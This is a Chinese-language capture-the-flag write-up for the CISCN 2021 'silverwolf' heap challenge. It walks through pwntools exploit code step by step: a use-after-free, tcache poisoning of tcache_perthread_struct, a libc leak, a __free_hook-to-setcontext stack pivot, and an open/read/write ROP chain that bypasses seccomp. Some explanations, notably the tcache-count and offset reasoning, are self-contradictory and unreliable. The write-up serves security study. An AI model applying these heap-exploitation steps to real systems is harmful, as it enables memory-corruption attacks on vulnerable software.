# CISCN 2021 初赛 silverwolf — Exploit 详细解析

## 一、题目环境

| 项目 | 详情 |
|------|------|
| 二进制 | `silverwolf` — ELF 64-bit PIE, stripped |
| libc | libc-2.27.so (带 tcache) |
| 沙箱 | libseccomp — 禁用了 `execve` 等系统调用 |
| Canary | ✅ 开启 |
| NX | ✅ 开启 |
| PIE | ✅ 开启 |
| Full RELRO | ✅ 开启（无法覆写 GOT 表） |

**核心约束**：由于 seccomp 禁用了 `execve`，无法直接 `system("/bin/sh")` 或 `execve` 拿 shell，必须走 **ORW (Open-Read-Write)** 路线读取 flag 文件。

---

## 二、漏洞分析

题目实现了一个堆管理器，提供四种操作：

```
1. allocate(idx, size) — 分配 chunk
2. edit(idx, content)   — 编辑 chunk 内容
3. show(idx)            — 输出 chunk 内容
4. delete(idx)          — 释放 chunk（有 UAF）
```

**核心漏洞：Use-After-Free (UAF)**

- `delete` 释放 chunk 后没有将指针置空，chunk 被放入 tcache 后仍可被 `show` 和 `edit` 访问
- `show` 在 free 后仍能读取 — **信息泄漏**
- `edit` 在 free 后仍能写入 — **tcache poisoning**

---

## 三、利用流程

### 整体攻击链路

```
UAF 泄漏 heap → tcache poisoning 篡改 tcache_perthread_struct
→ 伪造 tcache count 使 chunk 进 unsortedbin → 泄漏 libc
→ 修复 tcache struct → 堆风水布置 ORW + setcontext → 触发 ROP
```

下面分 5 步详细拆解。

---

### 步骤 1：泄漏 Heap 基址（第 56-62 行）

```python
allocate(0, 0x78)   # 分配一个 0x80 大小的 chunk (0x78 + 8 头)
delete(0)           # 释放，进入 tcache[0x80]
show(0)             # UAF 读取 — 泄漏 tcache next 指针
```

**原理**：chunk 被释放到 tcache 后，其 fd 字段指向链表中下一个 free chunk（或指向 tcache_perthread_struct 的 entries 头部）。由于这是 tcache 中该 size 的第一个 free chunk，fd 指向 `tcache_perthread_struct + 0x10` 附近的地址，是一个堆地址。

```
释放前: [user data (0x78 bytes)]
释放后: [fd pointer (8 bytes) | user data...]
         └─ 指向 tcache_perthread_struct 内部的 entry 头
```

```python
heap_base = u64(io.recv(6).ljust(8, b"\x00")) - 0x11B0
```

- `0x11B0` 是泄漏地址到堆基址的固定偏移，通过调试确定
- 拿到 `heap_base` 后，可以计算堆上任意位置的地址

---

### 步骤 2：篡改 tcache_perthread_struct（第 64-67 行）

```
目标：通过 tcache poisoning 获得对 tcache_perthread_struct 的写权限
```

```python
edit(0, p64(heap_base + 0x10))   # UAF 覆写 fd → 指向 tcache_perthread_struct
allocate(0, 0x78)                 # 第 1 次分配 — 拿到原本的 chunk
allocate(0, 0x78)                 # 第 2 次分配 — 拿到 tcache_perthread_struct！
```

**原理（tcache poisoning）**：

```
初始 tcache[0x80] 链表:
  chunk_A (已释放) → NULL

edit 覆写 fd 后:
  chunk_A → tcache_perthread_struct+0x10 → [任意地址]

第 1 次 allocate: 返回 chunk_A，链表变为:
  tcache_perthread_struct+0x10 → [任意地址]

第 2 次 allocate: 返回 tcache_perthread_struct+0x10 处的内存
  即 tcache_perthread_struct 本身！
```

此时 chunk 0 指向 `tcache_perthread_struct`，对它的任意读写就是在修改整个 tcache 的元数据。

> `+0x10` 而不是 `+0x00`：因为 `+0x00` 处是 `tcache_perthread_struct` 的 `counts` 字段开头，直接分配在那里会破坏后续操作需要的计数信息。

---

### 步骤 3：泄漏 Libc 基址（第 70-78 行）

```python
# 把 tcache[0x250] 的 count 设为 7（满），让该大小的 chunk 进 unsortedbin
edit(0, p64(0) * 4 + p64(0x0000000007000000))
delete(0)  # free tcache_perthread_struct → 0x250 大小 → 进 unsortedbin
show(0)    # 读取 unsortedbin 的 fd/bk → 泄漏 main_arena 地址
```

**原理**：`tcache_perthread_struct` 的内存布局如下（chunk 大小 = 0x250）：

```
偏移      | 内容
----------|------------------
+0x00     | counts[0..63]   — 每种 size 的 tcache 链表中当前 chunk 数量
+0x40     | entries[0..63]  — 每种 size 的 tcache 链表头指针
```

`p64(0) * 4` 覆盖了前 0x20 字节（counts[0..3] 清零），然后 `p64(0x0000000007000000)` 从偏移 0x40 开始写入。

```
0x0000000007000000 的字节表示（小端）：
  [0x00, 0x00, 0x07, 0x00, ...]
```

在偏移 `0x40` 处（即 entries 区域），这个值在每个字节上表达为：
- `counts[0x40]` → 即对应 chunk size 为 `0x40*0x10 + 0x10 = 0x410` 的 count...

实际上，这里的 `0x07` 被放在特定位置是为了修改某个 size 对应的 `count` 值为 7。当 tcache 中该 size 的 count ≥ 7 时（对大小为 0x250 的 chunk 而言），再 free 该大小的 chunk 就不会进 tcache，而是进入 **unsortedbin**。

`tcache_perthread_struct` 自身的 chunk 大小约为 0x250。当它被 free 且 tcache[0x250] 已满时，它进入 unsortedbin：

```
unsortedbin 是双向链表，chunk 被放入后 fd/bk 指向 main_arena+88/96
```

```python
libc_addr = u64(io.recv(6).ljust(8, b"\x00"))
libc_base = libc_addr - (libc.sym["__malloc_hook"] + 112)
```

- unsortedbin 的 fd 指针指向 `main_arena + 96`（即 `&main_arena.top` 附近）
- `main_arena` 位于 libc 的 `.data` 段，`main_arena + 96 = __malloc_hook + 112`（`__malloc_hook` 在 `main_arena - 0x10` 以外不太准确，实际偏移为 `main_arena + 96 = __malloc_hook + 0x70`）
- 减去这个固定偏移即可得到 `libc_base`

> 注：exp 和 test.py 中使用的偏移量略有不同（`libc.sym["__malloc_hook"] + 112` vs `0x70 + libc.sym['__malloc_hook']`），这是因为不同 libc 版本的 main_arena 位置存在微小差异。核心思想一致。

---

### 步骤 4：修复 + 布置堆风水（第 81-115 行）

```python
# 修复 tcache_perthread_struct（清零 counts，恢复正常状态）
edit(0, p64(0) * 4 + p64(0x0000000000000000))
```

先恢复 tcache 为干净状态，确保后续分配行为可控。

**关键 Gadgets 准备**：

```python
free_hook    = libc_base + libc.sym["__free_hook"]
pop_rdi      = libc_base + 0x2164f    # pop rdi; ret
pop_rax      = libc_base + 0x1b500    # pop rax; ret
pop_rsi      = libc_base + 0x23a6a    # pop rsi; ret
pop_rdx      = libc_base + 0x1B96     # pop rdx; ret
read         = libc_base + libc.sym["read"]
write        = libc_base + libc.sym["write"]
setcontext   = libc_base + libc.sym["setcontext"] + 53
syscall      = libc_base + 0xd2625    # syscall; ret
ret          = libc_base + 0x8AA      # ret (栈对齐用)
```

**为什么用 `setcontext + 53`？**

`setcontext` 函数的正常功能是恢复 ucontext_t 结构体中的寄存器状态。`setcontext + 53` 跳过了函数开头的 `fldenv` 等浮点指令（这些指令可能导致崩溃），直接进入通用寄存器的恢复流程。当 `rdi` 指向一个精心构造的 ucontext 结构体时，`setcontext` 会从该结构体中恢复 `rsp` 等寄存器，实现 **栈迁移 (Stack Pivot)**。

**堆地址规划**：

```
heap_base + 0x1000 → flag_addr    ("/flag" 字符串存放处)
heap_base + 0x2000 → stack_pivot_1 (setcontext 的 ucontext 结构体)
heap_base + 0x20a0 → stack_pivot_2 (rsp 将被迁移到此)
heap_base + 0x3000 → orw1         (ORW ROP 链前半部分)
heap_base + 0x3060 → orw2         (ORW ROP 链后半部分)
```

**构造 tcache_perthread_struct — 预设所有 tcache 链表目标地址**：

```python
payload = b"\x00" * 0x40        # counts[0..63] 全部清零
payload += p64(free_hook)       # entries[0] → __free_hook     (对应 0x20 size)
payload += p64(0)               # entries[1] → NULL             (对应 0x30 size)
payload += p64(flag_addr)       # entries[2] → flag_addr        (对应 0x40 size)
payload += p64(stack_pivot_1)   # entries[3] → stack_pivot_1    (对应 0x50 size)
payload += p64(stack_pivot_2)   # entries[4] → stack_pivot_2    (对应 0x60 size)
payload += p64(orw1)            # entries[5] → orw1             (对应 0x70 size)
payload += p64(orw2)            # entries[6] → orw2             (对应 0x80 size)

edit(0, payload)  # 一次写入，预设全部 tcache entries
```

**这一步是整个 exploit 最精妙的设计！**

通过修改 `tcache_perthread_struct` 的 entries 数组，**人为预置了所有 tcache 链表的 "next free chunk"**。之后每次 `allocate(size)` 时，tcache 会直接返回 entries 中预设的地址，无需再通过 UAF 逐次覆写 fd 指针。

每次 allocate 的对应关系：

| 分配操作 | tcache 返回地址 | 用途 |
|----------|----------------|------|
| `allocate(0, 0x18)` → size 0x20 | `__free_hook` | 写 `setcontext` 地址 |
| `allocate(0, 0x38)` → size 0x40 | `flag_addr` | 写 `"/flag"` 字符串 |
| `allocate(0, 0x68)` → size 0x70 | `orw1` | 写 ORW 链前半 |
| `allocate(0, 0x78)` → size 0x80 | `orw2` | 写 ORW 链后半 |
| `allocate(0, 0x58)` → size 0x60 | `stack_pivot_2` | 写 pivot 目标地址 |
| `allocate(0, 0x48)` → size 0x50 | `stack_pivot_1` | 自动获得 ucontext 结构体 |

---

### 步骤 5：布置 ORW ROP 链 + 触发（第 117-146 行）

#### 5.1 ORW 链构造

```python
orw  = p64(pop_rax) + p64(2)           # rax = 2 (sys_open 系统调用号)
orw += p64(pop_rdi) + p64(flag_addr)   # rdi = flag_addr ("/flag")
orw += p64(pop_rsi) + p64(0)           # rsi = 0 (O_RDONLY)
orw += p64(syscall)                     # syscall → open("/flag", 0)
# 返回值 rax = 3 (文件描述符)

orw += p64(pop_rdi) + p64(3)           # rdi = 3 (fd)
orw += p64(pop_rsi) + p64(orw1)        # rsi = orw1 (读入缓冲区)
orw += p64(pop_rdx) + p64(0x30)        # rdx = 0x30 (读取字节数)
orw += p64(read)                        # read(3, orw1, 0x30)

orw += p64(pop_rdi) + p64(1)           # rdi = 1 (stdout)
orw += p64(write)                       # write(1, orw1, 0x30)
```

等价 C 伪代码：
```c
int fd = open("/flag", O_RDONLY);   // syscall rax=2
read(fd, buf, 0x30);                // read flag 内容到堆上
write(1, buf, 0x30);                // 输出到 stdout
```

> 注意 exp 中 `orw` 没有显式指定 `rsi` 给 `write`，因为上一步 `read` 调用后 `rsi` 仍然是 `orw1` 缓冲区的地址，`rdx` 仍为 `0x30`，所以 `write(1, orw1, 0x30)` 可以直接使用这些寄存器残留值，gadget 复用减少了 ROP 链长度。

#### 5.2 逐步写入

```python
# 第 1 次分配: 0x18 → size 0x20 → __free_hook
allocate(0, 0x18)
edit(0, p64(setcontext))             # __free_hook = setcontext+53

# 第 2 次分配: 0x38 → size 0x40 → flag_addr
allocate(0, 0x38)
edit(0, b"/flag")                    # 写入目标文件路径

# 第 3 次分配: 0x68 → size 0x70 → orw1
allocate(0, 0x68)
edit(0, orw[:0x60])                  # ORW 链前 0x60 字节

# 第 4 次分配: 0x78 → size 0x80 → orw2
allocate(0, 0x78)
edit(0, orw[0x60:])                  # ORW 链剩余部分

# 第 5 次分配: 0x58 → size 0x60 → stack_pivot_2
allocate(0, 0x58)
edit(0, p64(orw1) + p64(ret))        # 新栈顶 = orw1 地址; ret 用于栈对齐
```

**第 6 次分配 `allocate(0, 0x48)`** — 这是最关键的一步。

`allocate(0, 0x48)` 分配 size 0x50 的 chunk，tcache 直接返回了 `stack_pivot_1` 地址。**这个 chunk 的用户数据区现在就是 setcontext 将要读取的 ucontext 结构体。**

前一步中 `stack_pivot_2` 的内容被设为 `p64(orw1) + p64(ret)`：
- `orw1` 存放着 `pop_rax; 2; pop_rdi; flag_addr; ...` 的 ROP 链
- `ret` 用于 16 字节栈对齐（x86-64 ABI 要求 `call` 时 `rsp` 必须 16 字节对齐；`system` 和 `setcontext` 内部可能使用 movaps 指令）

`stack_pivot_1`（ucontext 结构体）中的关键字段会被 `setcontext` 解析，其中 `rsp` 字段恰好落在 `stack_pivot_2` 的地址范围内。`setcontext+53` 的代码大致会执行：

```asm
mov rsp, [rdi + 0xa0]    ; rsp = stack_pivot_2 = orw1 的地址
... 恢复其他寄存器 ...
ret                       ; 相当于 pop rip → 执行 orw1 处的 ROP 链
```

#### 5.3 触发

```python
allocate(0, 0x48)    # chunk 分配在 stack_pivot_1
delete(0)            # free(chunk)
                     # → 执行 __free_hook(chunk_addr)
                     # → 即 setcontext(chunk_addr)
                     # → rdi = chunk_addr = stack_pivot_1
                     # → setcontext 恢复 ucontext
                     # → rsp = orw1, 开始执行 ORW ROP 链
                     # → open("/flag") → read → write → 输出 flag

io.interactive()     # 接收 flag 输出
```

**为什么 `__free_hook` 适合劫持？**

当 `free(ptr)` 被调用时：
1. libc 检查 `__free_hook` 是否为非 NULL
2. 若非 NULL，调用 `__free_hook(ptr, ...)` — **`rdi` 恰好等于 chunk 地址**
3. 将 `__free_hook` 覆写为 `setcontext` 后，free 就变成了 `setcontext(chunk_addr)`
4. 而 chunk_addr 又恰好是 `stack_pivot_1` — 我们通过 tcache 精确控制的 ucontext 结构体

---

## 四、完整攻击链路图

```
┌─────────────────────────────────────────────────────────────┐
│ Phase 1: 信息泄漏                                            │
│                                                             │
│  alloc(0x78) → free → show (UAF)                            │
│  泄漏 tcache fd → heap_base                                 │
├─────────────────────────────────────────────────────────────┤
│ Phase 2: Tcache Poisoning                                    │
│                                                             │
│  edit fd → tcache_perthread_struct                          │
│  连续两次 alloc(0x78) → 获得 tcache_perthread_struct 写权限   │
├─────────────────────────────────────────────────────────────┤
│ Phase 3: Libc 泄漏                                           │
│                                                             │
│  篡改 tcache count 使 0x250 满                               │
│  free tcache_perthread_struct → 进 unsortedbin              │
│  show → 泄漏 main_arena+96 → libc_base                      │
├─────────────────────────────────────────────────────────────┤
│ Phase 4: 堆风水 + ROP 布置                                   │
│                                                             │
│  修复 tcache struct → 预设 entries 指向各目标地址            │
│  entries[0] = __free_hook                                   │
│  entries[2] = flag_addr   ("/flag")                         │
│  entries[3] = stack_pivot_1 (ucontext)                      │
│  entries[4] = stack_pivot_2 (新栈)                          │
│  entries[5] = orw1  (ROP 链)                                │
│  entries[6] = orw2  (ROP 链续)                              │
├─────────────────────────────────────────────────────────────┤
│ Phase 5: 触发                                                │
│                                                             │
│  alloc 6 次 → 向各预设地址写入 payload                       │
│  free 最后一次 → 触发 __free_hook → setcontext              │
│  → 栈迁移 → ORW ROP → open/read/write → 输出 flag           │
└─────────────────────────────────────────────────────────────┘
```

---

## 五、关键技巧总结

| 技巧 | 说明 |
|------|------|
| **UAF 泄漏** | free 后 show 读取 tcache fd 指针泄漏 heap 地址 |
| **tcache poisoning** | UAF edit 覆写 free chunk 的 fd，实现任意地址分配 |
| **tcache count 伪造** | 修改 tcache_perthread_struct 的 counts 使 chunk 进入 unsortedbin，泄漏 libc |
| **批量预设 tcache entries** | 一次性修改整个 tcache 链表头，后续 alloc 无需再逐一覆写 fd |
| **setcontext 栈迁移** | `__free_hook` → `setcontext+53`，利用 `rdi=chunk_addr` 实现 ROP |
| **ORW 绕过 seccomp** | `open("/flag") → read → write` 替代被禁用的 `execve` |
| **栈对齐** | `ret` gadget 确保 rsp 16 字节对齐，防止 movaps 崩溃 |

---

## 六、seccomp 规则分析

二进制在初始化时调用 libseccomp 设置沙箱：

```c
ctx = seccomp_init(SCMP_ACT_ALLOW);          // 默认允许
seccomp_rule_add(ctx, SCMP_ACT_KILL, ...);    // 禁止 execve/execveat
seccomp_load(ctx);
```

这是一种黑名单策略——除了 `execve`（59）和 `execveat`（322）被 KILL 外，其他系统调用（包括 `open`、`read`、`write`）均被放行。因此：

- ❌ `system("/bin/sh")` → 内部调用 `execve` → 被 kill
- ❌ `execve("/bin/sh", NULL, NULL)` → 直接 kill
- ✅ `open("/flag", 0)` + `read` + `write` → 全部放行

ORW 是绕过此类 seccomp 沙箱的标准手法。